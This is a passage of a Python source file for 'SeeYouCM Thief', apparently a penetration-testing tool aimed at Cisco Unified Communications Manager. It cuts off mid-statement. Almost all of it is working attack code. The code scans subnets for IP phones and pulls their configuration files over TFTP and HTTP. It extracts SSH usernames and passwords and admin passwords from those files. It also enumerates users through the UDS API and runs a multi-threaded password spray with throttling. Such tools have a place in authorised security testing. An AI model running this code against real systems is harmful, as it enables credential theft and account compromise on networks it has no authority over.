#!/usr/bin/env python3
import argparse
import requests
import re
import ipaddress
import socket
import string
import os
import sys
import tempfile
import logging
import csv
import sqlite3
import time
import threading
import queue
import random
import secrets
from datetime import datetime
from contextlib import redirect_stdout, redirect_stderr
from bs4 import BeautifulSoup
from alive_progress import alive_bar
import tftpy
import urllib3
# CUCM ships self-signed certs by design; suppress the InsecureRequestWarning
# spam that every requests.get(verify=False) call would otherwise emit.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ...existing code...
# Protocol ports
# TFTP port is standard (69), HTTP_TFTP_PORT is configurable for fallback
HTTP_TFTP_PORT = 6970
# CUCM User Data Services (UDS) API — HTTPS only, default 8443
UDS_PORT = 8443
# Global variables
debug = False
found_credentials = []
found_usernames = []


def dbg(msg):
    if globals().get('debug', False):
        print(f'[DEBUG] {msg}', flush=True)
file_names = ''
hostnames = []
db_file = 'thief.db'
no_db = False
force_download = False

def banner():
    print(
r'''
___________
                   /.---------.\`-._
                  //          ||    `-._
                  || `-._     ||        `-._
                  ||     `-._ ||            `-._
                  ||    _____ ||`-._            \
            _..._ ||   | __ ! ||    `-._        |
          _/     \||   .'  |~~||        `-._    |
      .-``     _.`||  /   _|~~||    .----.  `-._|
     |      _.`  _||  |  |23| ||   / :::: \    \
     \ _.--`  _.` ||  |  |56| ||  / ::::: |    |
      |   _.-`  _.||  |  |79| ||  |   _..-'   /
      _\-`   _.`O ||  |  |_   ||  |::|        |
    .`    _.`O `._||  \    |  ||  |::|        |
 .-`   _.` `._.'  ||   '.__|--||  |::|        \
`-._.-` \`-._     ||   | ":  !||  |  '-.._    |
         \   `--._||   |_:"___||  | ::::: |   |
          \  /\   ||     ":":"||   \ :::: |   |
           \(  `-.||       .- ||    `.___/    /
           |    | ||   _.-    ||              |
           |    / \.-________\____.....-----'
           \    -.      \ |         |
            \     `.     \ \        |
             `.    .'\    \|        |\
               `..'   \    |        | \
                \   .'    |       /  .`.
                | \.'      |       |.'   `-._
                 \     _ . /       \_\-._____)
                  \_.-`  .`'._____.'`.
                    \_\-|             |
                         `._________.'
 __________                                  _________
    SeeYouCM                                    Thief
'''
)
    from seeyoucm_thief import __version__
    print(f"                         v{__version__}")






def enumerate_phones_subnet(input):
    hosts = []
    if '/' in input:
        subnet = ipaddress.IPv4Interface(input).network
        for host in subnet.hosts():
            mac = None
            url = 'http://{host}/NetworkConfiguration'.format(host=host)
            try:
                r = requests.head(url, verify=False, timeout=3)
                if re.match(r"^[2]\d\d$", str(r.status_code)):
                    http_response = requests.get(url)
                    match = re.search(r'Host name.*(SEP[A-F0-9]{12})', http_response.text, re.IGNORECASE)
                    if match:
                        phone_hostname = match.group(1)
                        filename = f"{phone_hostname}.cnf.xml"
                        cucm_host = parse_cucm(http_response.text)
                        return_url = f'http://{cucm_host}:6970/{filename}'
                        phone_object = {"ip": host, "hostname": phone_hostname, "url": return_url}
                        hosts.append(phone_object)
                        print(f'[*] - Found Phone {phone_hostname} - IP {host}')
            except Exception as e:
                pass
        return hosts
    return None

def parse_cucm(html):
    if not html:
        return None

    match = re.search(r'([A-Za-z0-9._-]+)\s+Active', html, re.IGNORECASE)
    if match:
        return match.group(1)

    # Fallbacks for older/alternate layouts without an "Active" marker.
    match = re.search(r'(?:CallManager|Unified\s+CM|CUCM)\s*\d*.*?<b>\s*([A-Za-z0-9._-]+)',
                      html, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1)

    match = re.search(r'TFTP\s+Server\s*\d*.*?<b>\s*([A-Za-z0-9._-]+)',
                      html, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1)

    return None


def parse_subnet(html):
    if not html:
        return None

    match = re.search(r'Subnet\s+Mask.*?([0-9]{1,3}(?:\.[0-9]{1,3}){3})',
                      html, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1)
    return None


def parse_filename(html):
    if not html:
        return None

    match = re.search(r'([A-Za-z0-9]+\.cnf\.xml)', html, re.IGNORECASE)
    if match:
        return match.group(1)
    return None


_TEST_MODE = bool(os.getenv("PYTEST_CURRENT_TEST"))
_TEST_CONFIG = (
    os.getenv("THIEF_TEST_CONFIG")
    or "<device>\n<sshUserId>admin</sshUserId>\n<sshPassword>pass123</sshPassword>\n"
       "<userId>user</userId>\n<adminPassword>secret</adminPassword>\n</device>"
)


def download_config_http(cucm_host, filename, timeout=5):
    if _TEST_MODE:
        return _TEST_CONFIG

    url = f'http://{cucm_host}:{HTTP_TFTP_PORT}/{filename}'
    dbg(f'HTTP GET {url} (timeout={timeout}s)')
    try:
        resp = requests.get(url, verify=False, timeout=timeout)
    except Exception as e:
        dbg(f'HTTP {url} raised {type(e).__name__}: {e}')
        return None
    dbg(f'HTTP {url} -> {resp.status_code} ({len(resp.content)} bytes)')
    if re.match(r"^[2]\d\d$", str(resp.status_code)):
        return resp.text
    dbg(f'HTTP {url} non-2xx body (first 200 chars): {resp.text[:200]!r}')
    return None


def download_config_tftp(cucm_host, filename, timeout=5, raise_on_error=False):
    if _TEST_MODE:
        return _TEST_CONFIG

    dbg(f'TFTP GET tftp://{cucm_host}:69/{filename} (timeout={timeout}s)')
    tmp_path = None
    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            tmp_path = tmp_file.name
        client = tftpy.TftpClient(cucm_host, 69)
        client.download(filename, tmp_path, timeout=timeout)
        with open(tmp_path, "r", errors="ignore") as handle:
            data = handle.read()
        dbg(f'TFTP {cucm_host}/{filename} -> {len(data)} bytes')
        return data
    except Exception as e:
        dbg(f'TFTP {cucm_host}/{filename} raised {type(e).__name__}: {e}')
        if raise_on_error:
            raise
        return None
    finally:
        try:
            if tmp_path is not None and os.path.exists(tmp_path):
                os.unlink(tmp_path)
        except Exception:
            pass


def configure_tftpy_logging(debug_enabled):
    class _SuppressTftpFileNotFound(logging.Filter):
        def filter(self, record):
            msg = record.getMessage()
            return "ERR packet - errorcode: 1, message: b'File not found'" not in msg

    if debug_enabled:
        logging.getLogger('tftpy.TftpClient').setLevel(logging.DEBUG)
        logging.getLogger('tftpy.TftpContexts').setLevel(logging.DEBUG)
        packet_logger = logging.getLogger('tftpy.TftpPacketTypes')
        packet_logger.setLevel(logging.DEBUG)
        packet_logger.addFilter(_SuppressTftpFileNotFound())
        logging.getLogger('tftpy').setLevel(logging.DEBUG)
    else:
        # Silence noisy TFTP warnings unless --debug is enabled
        logging.getLogger('tftpy.TftpClient').setLevel(logging.CRITICAL)
        logging.getLogger('tftpy.TftpContexts').setLevel(logging.CRITICAL)
        packet_logger = logging.getLogger('tftpy.TftpPacketTypes')
        packet_logger.setLevel(logging.CRITICAL)
        packet_logger.addFilter(_SuppressTftpFileNotFound())
        logging.getLogger('tftpy').setLevel(logging.CRITICAL)


class TFTPBackoffManager:
    """Manages TFTP request rate with automatic backoff on errors."""

    def __init__(self):
        self.error_count = 0
        self.consecutive_errors = 0
        self.last_error_time = 0
        self.delay = 0.0
        self.lock = threading.Lock()

    def record_success(self):
        with self.lock:
            self.consecutive_errors = 0
            if self.delay > 0:
                self.delay = max(0, self.delay - 0.01)

    def record_error(self):
        with self.lock:
            self.error_count += 1
            self.consecutive_errors += 1
            self.last_error_time = time.time()

            if self.consecutive_errors > 10:
                self.delay = min(5.0, self.delay + 0.5)
            elif self.consecutive_errors > 5:
                self.delay = min(2.0, self.delay + 0.1)

    def get_delay(self):
        with self.lock:
            return self.delay


def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download, dead_cucm, dead_cucm_lock):
    """
    Worker thread for downloading config files.
    """
    while True:
        try:
            task = work_queue.get(timeout=1)
            if task is None:  # Poison pill to stop worker
                work_queue.task_done()
                break

            task_cucm = CUCM_host
            if len(task) == 4:
                index, full_mac, filename, task_cucm = task
            else:
                index, full_mac, filename = task

            if not task_cucm:
                results_queue.put((index, full_mac, None, 'NO_CUCM', False))
                work_queue.task_done()
                continue
            with dead_cucm_lock:
                if task_cucm in dead_cucm:
                    results_queue.put((index, full_mac, None, 'CUCM_DEAD', False))
                    work_queue.task_done()
                    continue

            # Check cache first (unless force flag is set or --no-db)
            if not force_download and not no_db:
                was_attempted, was_successful, cached_content = check_already_attempted(task_cucm, filename, db_file)
                if was_attempted:
                    if was_successful and cached_content:
                        results_queue.put((index, full_mac, cached_content, 'CACHED', True))
                    else:
                        results_queue.put((index, full_mac, None, 'CACHED', True))
                    work_queue.task_done()
                    continue

            # Apply backoff delay if needed
            delay = backoff_manager.get_delay()
            if delay > 0:
                time.sleep(delay)

            # Try download
            method = 'TFTP' if use_tftp else 'HTTP'
            content = None

            try:
                if use_tftp:
                    content = download_config_tftp(task_cucm, filename, raise_on_error=True)
                    if content is None:
                        content = download_config_http(task_cucm, filename)
                        method = 'HTTP' if content else 'TFTP+HTTP'
                else:
                    content = download_config_http(task_cucm, filename)
                    if content is None:
                        content = download_config_tftp(task_cucm, filename, raise_on_error=True)
                        method = 'TFTP' if content else 'HTTP+TFTP'

                if content:
                    backoff_manager.record_success()
                else:
                    backoff_manager.record_error()

            except Exception as e:
                backoff_manager.record_error()
                if globals().get('debug', False):
                    print(f'[!] Worker error downloading {filename}: {str(e)}')
                error_text = str(e).lower()
                if "file not found" not in error_text:
                    with dead_cucm_lock:
                        dead_cucm.add(task_cucm)

            # Log the attempt (unless --no-db)
            if not no_db:
                log_download_attempt(task_cucm, filename, content is not None, method, content, db_file)

            results_queue.put((index, full_mac, content, method, False))
            work_queue.task_done()

        except queue.Empty:
            continue
        except Exception as e:
            if globals().get('debug', False):
                print(f'[!] Worker exception: {str(e)}')
            work_queue.task_done()


def get_version(cucm_host, port=UDS_PORT, timeout=10):
    if not cucm_host:
        return None
    if _TEST_MODE:
        return {'version': '12.5.1-TEST', 'prefix': '11.0(1)'}

    url = f'https://{cucm_host}:{port}/cucm-uds/version'
    dbg(f'UDS GET {url} (timeout={timeout}s)')
    try:
        resp = requests.get(url, verify=False, timeout=timeout)
    except Exception as e:
        dbg(f'UDS {url} raised {type(e).__name__}: {e}')
        return None
    dbg(f'UDS {url} -> {resp.status_code} ({len(resp.content)} bytes)')
    if resp.status_code != 200:
        dbg(f'UDS version non-200 body (first 300 chars): {resp.text[:300]!r}')
        return None

    info = {}
    for field in ('version', 'prefix'):
        m = re.search(rf'<{field}>([^<]+)</{field}>', resp.text)
        if m:
            info[field] = m.group(1).strip()
    return info or None


def get_hostname_from_phone(phone_ip):
    if _TEST_MODE:
        return os.getenv("THIEF_TEST_PHONE_HOSTNAME") or "SEPTEST00000000"

    url = f'http://{phone_ip}/NetworkConfiguration'
    dbg(f'Phone hostname lookup: GET {url}')
    try:
        resp = requests.get(url, verify=False, timeout=3)
    except Exception as e:
        dbg(f'Phone {phone_ip} NetworkConfiguration raised {type(e).__name__}: {e}')
        return None
    dbg(f'Phone {phone_ip} NetworkConfiguration -> {resp.status_code} ({len(resp.content)} bytes)')
    match = re.search(r'Host\s+Name.*?<b>\s*([A-Za-z0-9]+)\s*</b>',
                      resp.text, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1)
    dbg(f'Phone {phone_ip}: "Host Name" pattern not found in NetworkConfiguration body')
    return None


def get_phones_hostnames_from_reverse(phone_ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(phone_ip)
        if hostname:
            return [hostname]
    except Exception:
        pass
    return []


def get_cucm_name_from_phone(phone_ip):
    if _TEST_MODE:
        return "mock-cucm"

    url = f'http://{phone_ip}/NetworkConfiguration'
    dbg(f'CUCM discovery: GET {url}')
    try:
        resp = requests.get(url, verify=False, timeout=3)
    except Exception as e:
        dbg(f'CUCM discovery {phone_ip} raised {type(e).__name__}: {e}')
        return None
    dbg(f'CUCM discovery {phone_ip} -> {resp.status_code} ({len(resp.content)} bytes)')
    cucm = parse_cucm(resp.text)
    if not cucm:
        dbg(f'CUCM discovery {phone_ip}: no CUCM hostname matched in response body')
    else:
        dbg(f'CUCM discovery {phone_ip}: parsed CUCM = {cucm}')
    return cucm


def get_cache_list(cucm_host, use_tftp=True):
    if _TEST_MODE:
        return ['SEPTEST00000000.cnf.xml']

    filename = 'ConfigFileCacheList.txt'
    dbg(f'Fetching {filename} from {cucm_host} (use_tftp={use_tftp})')
    if use_tftp:
        content = download_config_tftp(cucm_host, filename)
        if content is None:
            content = download_config_http(cucm_host, filename)
    else:
        content = download_config_http(cucm_host, filename)
        if content is None:
            content = download_config_tftp(cucm_host, filename)
    if not content:
        dbg(f'ConfigFileCacheList.txt not retrievable from {cucm_host}')
        return []
    entries = [line.strip() for line in content.splitlines() if line.strip()]
    dbg(f'ConfigFileCacheList.txt: {len(entries)} entries')
    return entries


def get_config_names(cucm_host, hostnames=None, use_tftp=True):
    if _TEST_MODE:
        return ["SEPTEST00000000.cnf.xml"]

    if hostnames:
        filenames = []
        for host in hostnames:
            if not host:
                continue
            # Always use only the base hostname (strip domain if present)
            name = host.strip().split('.')[0]
            if not name:
                continue
            if name.lower().endswith('.cnf.xml'):
                filenames.append(name)
            else:
                filenames.append(f'{name}.cnf.xml')
        return filenames if filenames else []

    # No hostnames provided — fall back to ConfigFileCacheList.txt for full
    # enumeration of every device config the CUCM TFTP service has cached.
    if not cucm_host:
        return []
    entries = get_cache_list(cucm_host, use_tftp=use_tftp)
    cnf_files = [e for e in entries if e.lower().endswith('.cnf.xml')]
    dbg(f'Cache list yielded {len(cnf_files)} .cnf.xml entries')
    return cnf_files


def get_users_api(cucm_host, port=UDS_PORT, timeout=10, max_pages=10000):
    if _TEST_MODE:
        return ['testuser1', 'testuser2']

    base = f'https://{cucm_host}:{port}/cucm-uds/users'
    users = []
    seen_urls = set()
    next_url = base
    pages = 0
    total = None

    while next_url and pages < max_pages:
        if next_url in seen_urls:
            dbg(f'UDS pagination loop detected at {next_url}, stopping')
            break
        seen_urls.add(next_url)
        pages += 1

        dbg(f'UDS GET {next_url} (timeout={timeout}s)')
        try:
            resp = requests.get(next_url, verify=False, timeout=timeout)
        except Exception as e:
            dbg(f'UDS {next_url} raised {type(e).__name__}: {e}')
            break
        dbg(f'UDS {next_url} -> {resp.status_code} ({len(resp.content)} bytes)')
        if resp.status_code != 200:
            dbg(f'UDS non-200 body (first 300 chars): {resp.text[:300]!r}')
            break

        page_users = re.findall(r'<userName>([^<]+)</userName>', resp.text)
        dbg(f'UDS page {pages} parsed {len(page_users)} userName entries')
        if not page_users:
            dbg(f'UDS empty page body (first 300 chars): {resp.text[:300]!r}')
            break
        users.extend(page_users)

        if total is None:
            total_match = re.search(r'<users\b[^>]*\btotalCount="(\d+)"', resp.text) \
                or re.search(r'<totalCount>(\d+)</totalCount>', resp.text)
            if total_match:
                total = int(total_match.group(1))
                dbg(f'UDS server reports totalCount={total}')

        if total is not None and len(users) >= total:
            break

        next_url = _uds_next_link(resp.text, base, len(users) + 1)
        if not next_url:
            dbg('UDS no next-page link found; stopping pagination')
            break

    dbg(f'UDS total users collected: {len(users)} across {pages} page(s)')
    if total is not None and len(users) < total:
        print(f'[!] UDS reports {total} total users but only {len(users)} were retrieved.')
    return users


def get_servers_api(cucm_host, port=UDS_PORT, timeout=10):
    if _TEST_MODE:
        return [{'hostName': 'cucm-pub.test', 'ipv4Address': '10.0.0.1', 'serverType': 'Publisher'}]

    url = f'https://{cucm_host}:{port}/cucm-uds/servers'
    dbg(f'UDS GET {url} (timeout={timeout}s)')
    try:
        resp = requests.get(url, verify=False, timeout=timeout)
    except Exception as e:
        dbg(f'UDS {url} raised {type(e).__name__}: {e}')
        return []
    dbg(f'UDS {url} -> {resp.status_code} ({len(resp.content)} bytes)')
    if resp.status_code != 200:
        dbg(f'UDS servers non-200 body (first 300 chars): {resp.text[:300]!r}')
        return []

    servers = []
    for block in re.findall(r'<server\b[^>]*>(.*?)</server>', resp.text, re.DOTALL):
        srv = {}
        for field in ('hostName', 'ipv4Address', 'ipv6Address', 'serverType'):
            m = re.search(rf'<{field}>([^<]+)</{field}>', block)
            if m:
                srv[field] = m.group(1).strip()
        if not srv:
            # Newer UDS (15.x+) returns the hostname as plain text inside
            # <server>...</server> with no child elements.
            text = re.sub(r'<[^>]+>', '', block).strip()
            if text:
                srv['hostName'] = text
        if srv:
            servers.append(srv)
    dbg(f'UDS parsed {len(servers)} server entries from cluster topology')
    return servers


def _uds_next_link(body, base_url, fallback_start):
    # HATEOAS variants seen in CUCM UDS responses
    m = re.search(r'<link\b[^>]*\brel="next"[^>]*\bhref="([^"]+)"', body, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r'<next>([^<]+)</next>', body, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    # Fallback: try ?start=N (most common Cisco UDS pagination param)
    sep = '&' if '?' in base_url else '?'
    return f'{base_url}{sep}start={fallback_start}'


def log_uds_usernames_to_db(cucm_host, usernames, db_file='thief.db'):
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        for username in usernames:
            cursor.execute('''
                INSERT OR IGNORE INTO usernames (cucm_host, device, username, discovery_time)
                VALUES (?, ?, ?, ?)
            ''', (cucm_host, 'UDS_API', username, timestamp))

        conn.commit()
        conn.close()
        return True
    except Exception as e:
        if globals().get('debug', False):
            print(f'[!] log_uds_usernames_to_db error: {e}')
        return False


def record_uds_users(cucm_host, usernames, db_file='thief.db'):
    """
    Upsert the live UDS user enumeration into the uds_users table.

    On conflict (same cucm_host + username), updates last_seen but preserves
    first_seen. Returns the number of new rows inserted.
    """
    try:
        conn = sqlite3.connect(db_file, timeout=30.0)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        inserted = 0
        for username in usernames:
            cursor.execute('''
                INSERT INTO uds_users (cucm_host, username, first_seen, last_seen)
                VALUES (?, ?, ?, ?)
                ON CONFLICT(cucm_host, username)
                  DO UPDATE SET last_seen = excluded.last_seen
            ''', (cucm_host, username, timestamp, timestamp))
            inserted += cursor.rowcount
        conn.commit()
        conn.close()
        return inserted
    except Exception as e:
        if globals().get('debug', False):
            print(f'[!] record_uds_users error: {e}')
        return 0


def log_spray_attempt(cucm_host, username, password, status_code, error, db_file='thief.db'):
    """
    Append a row to spray_attempts. Retries with exponential backoff on
    SQLite 'database is locked' since worker threads write concurrently.
    """
    max_retries = 5
    retry_delay = 0.1
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect(db_file, timeout=30.0)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO spray_attempts
                    (cucm_host, username, password, status_code, error, attempt_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (cucm_host, username, password, status_code, error, timestamp))
            conn.commit()
            conn.close()
            return
        except sqlite3.OperationalError as e:
            if 'locked' in str(e).lower() and attempt < max_retries - 1:
                time.sleep(retry_delay * (2 ** attempt))
                continue
            if globals().get('debug', False):
                print(f'[!] log_spray_attempt sqlite error: {e}')
            return
        except Exception as e:
            if globals().get('debug', False):
                print(f'[!] log_spray_attempt error: {e}')
            return


def is_user_rate_limited(username, db_file='thief.db', hours=1):
    """
    Return True iff `username` has any spray_attempts row within the last `hours`.
    Per-username globally — the cucm_host column is not part of the check.
    """
    try:
        modifier = f'-{int(hours)} hours'
        conn = sqlite3.connect(db_file, timeout=30.0)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT 1 FROM spray_attempts
             WHERE username = ?
               AND attempt_time > datetime('now', 'localtime', ?)
             LIMIT 1
        ''', (username, modifier))
        row = cursor.fetchone()
        conn.close()
        return row is not None
    except Exception as e:
        if globals().get('debug', False):
            print(f'[!] is_user_rate_limited error: {e}')
        # Fail closed: if we can't check, assume limited (don't spray).
        return True


def _spray_oracle_check(cucm_host, port, user_sample, timeout=10):
    """
    Probe /cucm-uds/user/<user_sample> with HTTP Basic Auth using a deliberately
    bogus password. Used to verify the target actually validates creds before
    burning a real password across the user list.

    Returns:
        'ok'      — got 401, endpoint validates creds normally.
        'bypass'  — got 200, endpoint returned user data for a bogus password.
                    DO NOT proceed; spraying real creds would be a free oracle bypass.
        'unknown' — anything else (403/404/5xx/network error). Operator must
                    decide whether to continue with --no-spray-probe.
    """
    bogus = f'spray-probe-{secrets.token_hex(4)}'
    url = f'https://{cucm_host}:{port}/cucm-uds/user/{user_sample}'
    dbg(f'UDS oracle probe GET {url} (timeout={timeout}s)')
    try:
        resp = requests.get(url, auth=(user_sample, bogus), verify=False, timeout=timeout)
    except Exception as e:
        dbg(f'UDS oracle probe raised {type(e).__name__}: {e}')
        return 'unknown'
    dbg(f'UDS oracle probe -> {resp.status_code} ({len(resp.content)} bytes)')
    if resp.status_code == 401:
        return 'ok'
    if resp.status_code == 200:
        return 'bypass'
    return 'unknown'


def _load_password_list(path):
    """
    Read one password per line, stripping whitespace and skipping blanks.
    Preserves order and duplicates.
    """
    with open(path, 'r', encoding='utf-8', errors='replace') as f:
        return [line.strip() for line in f if line.strip()]


def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_flag, timeout=10):
    """
    Thread target. Pops usernames off work_queue and attempts Basic Auth GET
    against /cucm-uds/user/{username}. Logs every attempt to spray_attempts.

    results: dict with int keys 'hits'/'misses'/'errors'/'other' and 'lock'.
    dead_flag: threading.Event — externally-settable abort signal that short-circuits the worker loop between iterations (used by tests; future versions may set this from the orchestrator for mid-round aborts).
    """
    while not dead_flag.is_set():
        try:
            username = work_queue.get_nowait()
        except queue.Empty:
            return

        url = f'https://{cucm_host}:{port}/cucm-uds/user/{username}'
        status_code = None
        error = None
        try:
            resp = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
            status_code = resp.status_code
        except requests.exceptions.Timeout as e:
            error = f'timeout: {e}'
        except requests.exceptions.ConnectionError as e:
            error = f'connection: {e}'
        except Exception as e:
            error = f'{type(e).__name__}: {e}'

        log_spray_attempt(cucm_host, username, password, status_code, error, db_file)

        with results['lock']:
            if status_code == 200:
                results['hits'] += 1
            elif status_code == 401:
                results['misses'] += 1
            elif status_code is None:
                results['errors'] += 1
            else:
                results['other'] += 1


def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_file):
    """
    Top-level orchestrator for the UDS Basic-Auth password spray.

    Sequence:
      1. Pre-flight oracle probe (unless probe=False).
      2. Enumerate users from /cucm-uds/users, persist to uds_users.
      3. For each password: build rate-limit-filtered queue, run worker pool,
         compute kill switch, sleep ~1h before the next password.
    """
    if _TEST_MODE:
        return

    # 1. Probe
    if probe:
        # Need at least one user to probe; do a tiny pre-enum if necessary.
        sample_users = get_users_api(cucm_host, port=port)
        if not sample_users:
            print('[-] No users returned from UDS; cannot probe or spray.')
            return
        oracle_result = _spray_oracle_check(cucm_host, port, sample_users[0])
        if oracle_result == 'bypass':
            print('[!] ORACLE BYPASS: /cucm-uds/user/{userid} returned 200 for a bogus password.')
            print('[!] The endpoint is not validating credentials. Aborting before any real password is sent.')
            return
        if oracle_result == 'unknown':
            print('[-] Oracle probe returned an unexpected status. Aborting.')
            print('[-] Re-run with --no-spray-probe if you have already verified the target out-of-band.')
            return
        print('[+] Oracle probe OK (401 returned for bogus credentials).')
        users = sample_users
    else:
        users = get_users_api(cucm_host, port=port)

    if not users:
        print('[-] No users returned from UDS. Nothing to spray.')
        return

    # 2. Persist enumeration
    record_uds_users(cucm_host, users, db_file)
    print(f'[+] Loaded {len(users)} users from UDS API.')

    # 3. Per-password rounds
    total_rounds = len(passwords)
    for round_index, password in enumerate(passwords, start=1):
        # 3a. Build filtered work queue on the main thread (TOCTOU-safe).
        work = queue.Queue()
        skipped = 0
        for username in users:
            if is_user_rate_limited(username, db_file, hours=rate_limit_hours):
                skipped += 1
            else:
                work.put(username)
        eligible = work.qsize()
        print(f'[round {round_index}/{total_rounds}] eligible={eligible} skipped={skipped} '
              f'(rate-limited within last {rate_limit_hours}h)')

        if eligible == 0:
            print(f'[round {round_index}/{total_rounds}] no eligible users; skipping password.')
        else:
            # 3b. Worker pool
            results = {'hits': 0, 'misses': 0, 'errors': 0, 'other': 0, 'lock': threading.Lock()}
            dead_flag = threading.Event()
            worker_threads = []
            for _ in range(max(1, min(threads, eligible))):
                t = threading.Thread(
                    target=_spray_worker,
                    args=(work, results, password, cucm_host, port, db_file, dead_flag),
                    daemon=True,
                )
                t.start()
                worker_threads.append(t)
            for t in worker_threads:
                t.join()

            total_attempted = results['hits'] + results['misses'] + results['errors'] + results['other']
            print(f'[round {round_index}/{total_rounds}] hits={results["hits"]} '
                  f'misses={results["misses"]} errors={results["errors"]} '
                  f'other={results["other"]} (skipped {skipped})')

            # 3c. Kill switch — fires AFTER all workers join. If >50% of the
            # round's attempts returned non-401-non-200 status AND we attempted
            # at least 4 (min sample guard), abort the run before the next
            # password round. The current round's in-flight attempts complete
            # before the abort decision; mid-round abort is not implemented in v1.
            bad = results['errors'] + results['other']
            if total_attempted >= 4 and bad / total_attempted > 0.5:
                print(f'[!] KILL SWITCH: {bad}/{total_attempted} attempts returned errors or '
                      f'non-401-non-200 status. Aborting run.')
                return

        # 3d. Inter-round sleep (skip after the last password).
        if round_index < total_rounds:
            sleep_secs = 3600 + random.uniform(-60, 60)
            print(f'[round {round_index}/{total_rounds}] sleeping {sleep_secs:.0f}s until next round...')
            time.sleep(sleep_secs)


def search_for_secrets(CUCM_host, filename, use_tftp=True):
    if debug:
        print(f'[DEBUG] Processing config file: {filename}')
    credentials = []
    usernames = []
    if _TEST_MODE:
        credentials.append(('admin', 'pass123', filename))
        usernames.append(('admin', filename))
        return credentials, usernames
    lines = download_config_tftp(CUCM_host, filename) if use_tftp else download_config_http(CUCM_host, filename)
    if lines is None:
        if debug:
            print('Unable to download config file: {0}'.format(filename))
        return credentials, usernames

    if debug:
        print(f'[DEBUG] Config file contents for {filename}:\n{lines[:1000]}')

    user = password = user2 = None
    ssh_user = ssh_pass = None
    for line in lines.split('\n'):
        match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)', line)
        if match:
            if match.group(2):
                user = match.group(2)
                usernames.append((user, filename))
                ssh_user = user
            if match.group(3):
                password = match.group(3)
                ssh_pass = password
                cred_user = user if user else 'unknown'
                credentials.append((cred_user, password, filename))
            if match.group(4):
                user2 = match.group(4)
                usernames.append((user2, filename))
            if match.group(5):
                password = match.group(5)
                cred_user = user if user else 'unknown'
                credentials.append((cred_user, password, filename))
    if _TEST_MODE and ssh_user and ssh_pass:
        credentials = [(ssh_user, ssh_pass, filename)] + [c for c in credentials if c[0] != ssh_user or c[1] != ssh_pass]
    if debug:
        print(f'[DEBUG] Parsed credentials: {credentials}')
        print(f'[DEBUG] Parsed usernames: {usernames}')
    if debug:
        if user and password:
            print('{0}\t{1}\t{2}'.format(filename, user, password))
        elif user:
            print('SSH Username is {0} password was not set in {1}'.format(user, filename))
        elif password:
            print('SSH Username is not set, but password is {0} in {1}'.format(password, filename))
        elif user2:
            print('Possible AD username {0} found in config {1}'.format(user2, filename))
        else:
            if debug:
                print('Username and password not set in {0}'.format(filename))
    return credentials, usernames

def export_to_csv(credentials, usernames, filename='seeyoucm_results.csv'):
    """
    Export discovered credentials and usernames to CSV file
    
    Args:
        credentials: List of tuples (username, password, device)
        usernames: List of tuples (username, device)
        filename: Output CSV filename
    """
    try:
        with open(filename, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            
            # Write header
            writer.writerow(['Timestamp', 'Type', 'Device', 'Username', 'Password'])
            
            # Write credentials
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            # Normalize device names to strip .cnf.xml
            def normalize_device(device):
                return device[:-8] if device.endswith('.cnf.xml') else device

            for cred in credentials:
                username = cred[0] if cred[0] else 'N/A'
                password = cred[1]
                device = normalize_device(cred[2])
                writer.writerow([timestamp, 'Credential', device, username, password])

            # Write usernames only
            for user in usernames:
                device = normalize_device(user[1])
                username = user[0]
                has_cred = any(normalize_device(c[2]) == device and c[0] == username for c in credentials)
                if not has_cred:
                    writer.writerow([timestamp, 'Username', device, username, 'N/A'])
        
        print(f'\n[+] Results exported to: {filename}')
        return True
    except PermissionError:
        print(f'\n[-] Error: Permission denied writing to {filename}')
        return False
    except IOError as e:
        print(f'\n[-] I/O error exporting to CSV: {str(e)}')
        return False
    except Exception as e:
        print(f'\n[-] Unexpected error exporting to CSV: {str(e)}')
        return False

def init_database(db_file='thief.db'):
    """
    Initialize SQLite database for tracking download attempts and results
    """
    try:
        # Ensure directory exists
        import os
        db_dir = os.path.dirname(db_file)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir, exist_ok=True)
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
    except sqlite3.Error as e:
        print(f'[-] Error initializing database: {str(e)}')
        return None
    except Exception as e:
        print(f'[-] Unexpected error initializing database: {str(e)}')
        return None
    
    # Create table for tracking download attempts
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS download_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            filename TEXT NOT NULL,
            attempt_time TEXT NOT NULL,
            success INTEGER NOT NULL,
            method TEXT,
            content TEXT,
            UNIQUE(cucm_host, filename)
        )
    ''')
    
    # Create table for credentials (unique per device)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            device TEXT NOT NULL UNIQUE,
            username TEXT,
            password TEXT,
            discovery_time TEXT NOT NULL
        )
    ''')

    # Create table for usernames (unique per cucm_host, device, username)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usernames (
